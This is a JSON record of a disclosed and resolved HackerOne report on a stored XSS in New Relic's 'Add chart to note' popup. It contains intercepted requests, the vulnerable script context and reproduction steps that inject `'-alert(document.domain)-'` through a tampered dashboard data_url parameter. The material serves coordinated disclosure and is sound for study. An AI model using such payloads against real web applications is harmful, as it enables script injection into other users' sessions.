{"id":566400,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjY0MDA=","url":"https://hackerone.com/reports/566400","title":"Stored XSS firing at the \"Add chart to note\" popup","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-05-04T15:44:55.603Z","submitted_at":"2019-05-04T15:44:55.603Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skavans","url":"/skavans","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-13T10:58:02.687Z","bug_reporter_agreed_on_going_public_at":"2020-08-11T09:32:22.768Z","team_member_agreed_on_going_public_at":"2020-08-13T10:58:02.606Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey team,\n\nI have long found that a request retrieving content for `Add chart to note` popup is XSS-vulnerable.\n\nThe following `Add to note` popup\n{F484252}\nretrieves its content via the following request:\n```http\nGET /accounts/2319495/notes/new?context_url=%2Faccounts%2F2319495%2Fcustom_dashboards%2Fpages%2F11859%3Ftw%255Bdur%255D%3Dlast_7_days%26tw%255Bend%255D%3D1556964641\u0026app_name=undefined\u0026app_id=undefined\u0026tw%5Bdur%5D=last_7_days\u0026tw%5Bend%5D=1556964641\u0026data_url=%2Fchart_data%2Fmetric_charts%2Fapp_breakdown.json%3Faccount_id%3D2319495%26agent%3D146132689%26application_id%3D146132689%26chart_type%3DStackedArea2D%26clickURL%3D%252Faccounts%252F2319495%252Fapplications%252F146132689%252Ftransactions%26current_product%3Dapm_product%26customLineWidth%3D2%26live%3Dtrue%26number_suffix%3Dms%26render_to%3Dcurrent_response_time_single_146132689%26tooltipGroup%3Dcurrent_charts%26title%3D%2526%2523x27%253B%2526quot%253Bx6nxss%2526gt%253B%2526lt%253Bimg%2Bsrc%253Dx6nxss%2526gt%253B%253A%2BAverage%2Bresponse%2Btime%252C%2Bby%2Btier%2B%2528ms%2529%26hide_legend%3Dtrue%26tw%255Bdur%255D%3Dlast_7_days%26tw%255Bend%255D%3D1556964641\u0026chart_title=%26amp%3B%23x27%3B%26amp%3Bquot%3Bx6nxss%26amp%3Bgt%3B%26amp%3Blt%3Bimg+src%3Dx6nxss%26amp%3Bgt%3B%3A+Average+response+time%2C+by+tier+(ms) HTTP/1.1\nHost: rpm.newrelic.com\n```\nThe `data_url` parameter is then reflected at the response body in a following way:\n```html\n\u003cscript type=\"text/javascript\"\u003e\n      jQuery(document).ready(function($) {\n        var chart_options = {\"height\":\"250px\",\"fluid\":false,\"snappable\":false,\"loadingOverlay\":true,\"render\":true};\n        chart_options.dataUrl = '/chart_data/metric_charts/app_breakdown.json?account_id=2319495\u0026agent=146132689\u0026application_id=146132689\u0026chart_type=StackedArea2D\u0026clickURL=%2Faccounts%2F2319495%2Fapplications%2F146132689%2Ftransactions\u0026current_product=apm_product\u0026customLineWidth=2\u0026hide_legend=true\u0026live=true\u0026number_suffix=ms\u0026render_to=current_response_time_single_146132689\u0026title=%26%23x27%3B%26quot%3Bx6nxss%26gt%3B%26lt%3Bimg+src%3Dx6nxss%26gt%3B%3A+Average+response+time%2C+by+tier+%28ms%29\u0026tooltipGroup=current_charts\u0026tw%5Bdur%5D=last_7_days\u0026tw%5Bend%5D=1556964641\u0026no_click=1\u0026no_links=1';\n        $('#snapping_chart').highcharts(chart_options);\n      });\n    \u003c/script\u003e\n```\n\nIf we place the single quote char into this parameter value, we can break the `chart_options.dataUrl` string containing this URL at the response and thus perform an XSS using some payload like `'-alert()-'`. So I wanted to report this as classic reflected XSS but there is a kind of protection, which checks the `X-Requested-With` request header is present, and returns the 400 response otherwise. So it was impossible to exploit this because it's impossible to send this header when user clicks the malicious link.\n\nBut during my today research I have found a way to turn this into a stored XSS via creating the specific malicious chart first. Then, when the victim tries to add this chart to a note, the XSS payload is executed. Let me describe this thoroughly.\n\nUsually, when we try to add some chart from the any part of New Relic application to a note, the `data_url` parameter for `Add to note` popup request is created using JS function, which grabs some chart parameters (like title, app_id, etc.) and then makes the URL from them. The URL making process is correct and safe so if we place the single quote inside some of these chart parameters, it will be urlencoded in resulting URL (according to HTTP specification). So if I create a chart with e.g. title `XSS'-alert()-'`, the resulting `data_url` built by JS will be like `/chart.json?title=XSS%27` and then, when this URL will be sent to provide an `Add to note` popup, it will be encoded the second time and will become like `/chart.json?title=XSS%2527`. And the resulting HTML will be safe because of this proper two-layer encoding.\n\nBut there is a place when I can manually control the chart URL – the custom dashboards. Here is how the custom dashboard chart is initialized:\n```html\n\u003cscript type='text/javascript'\u003e\n      jQuery(function($) {\n        var loadChart = function() {\n          $('#41862').highcharts({\n            height: '400',\n            dataUrl: '/chart_data/metric_charts/app_breakdown.json?account_id=2319495\u0026agent=146132689\u0026application_id=146132689\u0026chart_type=StackedArea2D\u0026clickURL=%2Faccounts%2F2319495%2Fapplications%2F146132689%2Ftransactions\u0026current_product=apm_product\u0026customLineWidth=2\u0026live=true\u0026number_suffix=ms\u0026render_to=current_response_time_single_146132689\u0026tooltipGroup=current_charts\u0026title=%26%23x27%3B%26quot%3Bx6nxss%26gt%3B%26lt%3Bimg+src%3Dx6nxss%26gt%3B%3A+Average+response+time%2C+by+tier+%28ms%29\u0026hide_legend=true',\n            render: true,\n            fluid: true,\n            loadingOverlay: true,\n            snappable: true,\n            chart_title: \"\u0026amp;#x27;\u0026amp;quot;x6nxss\u0026amp;gt;\u0026amp;lt;img src=x6nxss\u0026amp;gt;: Average response time, by tier (ms)\",\n            liveChart: false,\n            dataApiUrl: '',\n            zoom_url: '',\n            dataApiField: '',\n            addToDashboard: false,\n            embeddable: false\n          });\n        };\n        jQuery.rpm.highcharts.registerRender(loadChart);\n      });\n    \u003c/script\u003e\n```\nAnd when I try to add this chart to a note, the `data_url` parameter for request will be taken from the `dataURL` parameter directly. So all that I need to perform the attack is to place the single quote inside this custom dashboard chart `dataUrl` parameter. But I also need both scripts (this initializer and the one inside the `Add to note` popup) to be valid so the final payload is tricky a little.\n\n###Steps to reproduce\n1) Sign into the app via account with role `User` or higher\n2) Navigate to the some APM app, move mouse over some chart and click `More` -\u003e `Add to legacy custom dashboard`, enter some title and click `Add`. Intercept the request using some intercepting proxy tool (e.g. Burp Suite).\n3) At the intercept request replace the head of `mixed_dashboards_dashboard%5Bchart%5D%5Bdata_url%5D` parameter (`%2Fchart_data%2Fmetric_charts`...) with `/\\'-alert(document.domain)-\\'/..%2Fchart_data%2Fmetric_charts` and send the request. The response will contain the created custom dashboard link.\n4) Navigate to the created custom dashboard. If you inspect the page source, you will see how the pinned chart is initialized now:\n```html\n\u003cscript type='text/javascript'\u003e\n      jQuery(function($) {\n        var loadChart = function() {\n          $('#41871').highcharts({\n            height: '400',\n            dataUrl: '/\\'-alert(document.domain)-\\'/../chart_data/metric_charts/app_breakdown.json?account_id=2319495\u0026agent=146103643\u0026application_id=146103643\u0026chart_type=StackedArea2D\u0026clickURL=%2Faccounts%2F2319495%2Fapplications%2F146103643%2Ftransactions\u0026current_product=apm_product\u0026customLineWidth=2\u0026live=true\u0026number_suffix=ms\u0026render_to=current_response_time_single_146103643\u0026tooltipGroup=current_charts\u0026title=123123%3A+Average+response+time%2C+by+tier+%28ms%29\u0026hide_legend=true',\n            render: true,\n            fluid: true,\n            loadingOverlay: true,\n            snappable: true,\n            chart_title: \"123123: Average response time, by tier (ms)\",\n            liveChart: false,\n            dataApiUrl: '',\n            zoom_url: '',\n            dataApiField: '',\n            addToDashboard: false,\n            embeddable: false\n          });\n        };\n        jQuery.rpm.highcharts.registerRender(loadChart);\n      });\n    \u003c/script\u003e\n```\n5) Move mouse to the pinned chart and click `More` -\u003e `Add to note`. Make sure the payload is executed inside the popup.\n{F484275}\nIf you inspect the popup source now, you will see the payload inside:\n```js\njQuery(document).ready(function($) {\n        var chart_options = {\"height\":\"250px\",\"fluid\":false,\"snappable\":false,\"loadingOverlay\":true,\"render\":true};\n        chart_options.dataUrl = '/'-alert(document.domain)-'/../chart_data/metric_charts/app_breakdown.json?account_id=2319495\u0026agent=146103643\u0026application_id=146103643\u0026chart_type=StackedArea2D\u0026clickURL=%2Faccounts%2F2319495%2Fapplications%2F146103643%2Ftransactions\u0026current_product=apm_product\u0026customLineWidth=2\u0026hide_legend=true\u0026live=true\u0026number_suffix=ms\u0026render_to=current_response_time_single_146103643\u0026title=123123%3A+Average+response+time%2C+by+tier+%28ms%29\u0026tooltipGroup=current_charts\u0026tw%5Bdur%5D=last_7_days\u0026tw%5Bend%5D=1556964641\u0026no_click=1\u0026no_links=1';\n        $('#snapping_chart').highcharts(chart_options);\n      });\n```\n\nP.S.: These steps use the custom dashboards chart `dataUrl`, as inside the #544694, but the vulnerability itself is different – lack of `data_url` parameter escaping, when the `Add to note` popup is shown.\n\n###PoC-video:\nAs the exploitation is not trivial, I have recorded the video below, which demonstrates all the process.\n{F484277}\n\n## Impact\n\nWhen a victim tries to add a chart to note, the arbitrary malicious code is executed.","vulnerability_information_html":"\u003cp\u003eHey team,\u003c/p\u003e\n\n\u003cp\u003eI have long found that a request retrieving content for \u003ccode\u003eAdd chart to note\u003c/code\u003e popup is XSS-vulnerable.\u003c/p\u003e\n\n\u003cp\u003eThe following \u003ccode\u003eAdd to note\u003c/code\u003e popup\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"______________2019-05-04___17.26.01.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/252/e4719126be408642df7b78ec2484aff470a24e31/______________2019-05-04___17.26.01.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-05-04___17.26.01.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-05-04___17.26.01.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062132Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=c0aadb8637f6a998b0e2dba444c68b5ab92aa8efff2b6828dc693aa4487a6420\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/252/e4719126be408642df7b78ec2484aff470a24e31/______________2019-05-04___17.26.01.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-05-04___17.26.01.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-05-04___17.26.01.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062132Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=c0aadb8637f6a998b0e2dba444c68b5ab92aa8efff2b6828dc693aa4487a6420\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nretrieves its content via the following request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/accounts/2319495/notes/new?context_url=%2Faccounts%2F2319495%2Fcustom_dashboards%2Fpages%2F11859%3Ftw%255Bdur%255D%3Dlast_7_days%26tw%255Bend%255D%3D1556964641\u0026amp;app_name=undefined\u0026amp;app_id=undefined\u0026amp;tw%5Bdur%5D=last_7_days\u0026amp;tw%5Bend%5D=1556964641\u0026amp;data_url=%2Fchart_data%2Fmetric_charts%2Fapp_breakdown.json%3Faccount_id%3D2319495%26agent%3D146132689%26application_id%3D146132689%26chart_type%3DStackedArea2D%26clickURL%3D%252Faccounts%252F2319495%252Fapplications%252F146132689%252Ftransactions%26current_product%3Dapm_product%26customLineWidth%3D2%26live%3Dtrue%26number_suffix%3Dms%26render_to%3Dcurrent_response_time_single_146132689%26tooltipGroup%3Dcurrent_charts%26title%3D%2526%2523x27%253B%2526quot%253Bx6nxss%2526gt%253B%2526lt%253Bimg%2Bsrc%253Dx6nxss%2526gt%253B%253A%2BAverage%2Bresponse%2Btime%252C%2Bby%2Btier%2B%2528ms%2529%26hide_legend%3Dtrue%26tw%255Bdur%255D%3Dlast_7_days%26tw%255Bend%255D%3D1556964641\u0026amp;chart_title=%26amp%3B%23x27%3B%26amp%3Bquot%3Bx6nxss%26amp%3Bgt%3B%26amp%3Blt%3Bimg+src%3Dx6nxss%26amp%3Bgt%3B%3A+Average+response+time%2C+by+tier+(ms)\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003erpm.newrelic.com\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003edata_url\u003c/code\u003e parameter is then reflected at the response body in a following way:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text/javascript\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ejQuery\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eready\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003echart_options\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eheight\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e250px\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efluid\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003esnappable\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eloadingOverlay\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003erender\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003echart_options\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edataUrl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/chart_data/metric_charts/app_breakdown.json?account_id=2319495\u0026amp;agent=146132689\u0026amp;application_id=146132689\u0026amp;chart_type=StackedArea2D\u0026amp;clickURL=%2Faccounts%2F2319495%2Fapplications%2F146132689%2Ftransactions\u0026amp;current_product=apm_product\u0026amp;customLineWidth=2\u0026amp;hide_legend=true\u0026amp;live=true\u0026amp;number_suffix=ms\u0026amp;render_to=current_response_time_single_146132689\u0026amp;title=%26%23x27%3B%26quot%3Bx6nxss%26gt%3B%26lt%3Bimg+src%3Dx6nxss%26gt%3B%3A+Average+response+time%2C+by+tier+%28ms%29\u0026amp;tooltipGroup=current_charts\u0026amp;tw%5Bdur%5D=last_7_days\u0026amp;tw%5Bend%5D=1556964641\u0026amp;no_click=1\u0026amp;no_links=1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#snapping_chart\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ehighcharts\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003echart_options\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf we place the single quote char into this parameter value, we can break the \u003ccode\u003echart_options.dataUrl\u003c/code\u003e string containing this URL at the response and thus perform an XSS using some payload like \u003ccode\u003e\u0026#39;-alert()-\u0026#39;\u003c/code\u003e. So I wanted to report this as classic reflected XSS but there is a kind of protection, which checks the \u003ccode\u003eX-Requested-With\u003c/code\u003e request header is present, and returns the 400 response otherwise. So it was impossible to exploit this because it\u0026#39;s impossible to send this header when user clicks the malicious link.\u003c/p\u003e\n\n\u003cp\u003eBut during my today research I have found a way to turn this into a stored XSS via creating the specific malicious chart first. Then, when the victim tries to add this chart to a note, the XSS payload is executed. Let me describe this thoroughly.\u003c/p\u003e\n\n\u003cp\u003eUsually, when we try to add some chart from the any part of New Relic application to a note, the \u003ccode\u003edata_url\u003c/code\u003e parameter for \u003ccode\u003eAdd to note\u003c/code\u003e popup request is created using JS function, which grabs some chart parameters (like title, app_id, etc.) and then makes the URL from them. The URL making process is correct and safe so if we place the single quote inside some of these chart parameters, it will be urlencoded in resulting URL (according to HTTP specification). So if I create a chart with e.g. title \u003ccode\u003eXSS\u0026#39;-alert()-\u0026#39;\u003c/code\u003e, the resulting \u003ccode\u003edata_url\u003c/code\u003e built by JS will be like \u003ccode\u003e/chart.json?title=XSS%27\u003c/code\u003e and then, when this URL will be sent to provide an \u003ccode\u003eAdd to note\u003c/code\u003e popup, it will be encoded the second time and will become like \u003ccode\u003e/chart.json?title=XSS%2527\u003c/code\u003e. And the resulting HTML will be safe because of this proper two-layer encoding.\u003c/p\u003e\n\n\u003cp\u003eBut there is a place when I can manually control the chart URL – the custom dashboards. Here is how the custom dashboard chart is initialized:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;text/javascript\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ejQuery\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eloadChart\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#41862\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ehighcharts\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eheight\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e400\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003edataUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/chart_data/metric_charts/app_breakdown.json?account_id=2319495\u0026amp;agent=146132689\u0026amp;application_id=146132689\u0026amp;chart_type=StackedArea2D\u0026amp;clickURL=%2Faccounts%2F2319495%2Fapplications%2F146132689%2Ftransactions\u0026amp;current_product=apm_product\u0026amp;customLineWidth=2\u0026amp;live=true\u0026amp;number_suffix=ms\u0026amp;render_to=current_response_time_single_146132689\u0026amp;tooltipGroup=current_charts\u0026amp;title=%26%23x27%3B%26quot%3Bx6nxss%26gt%3B%26lt%3Bimg+src%3Dx6nxss%26gt%3B%3A+Average+response+time%2C+by+tier+%28ms%29\u0026amp;hide_legend=true\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003erender\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003efluid\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan 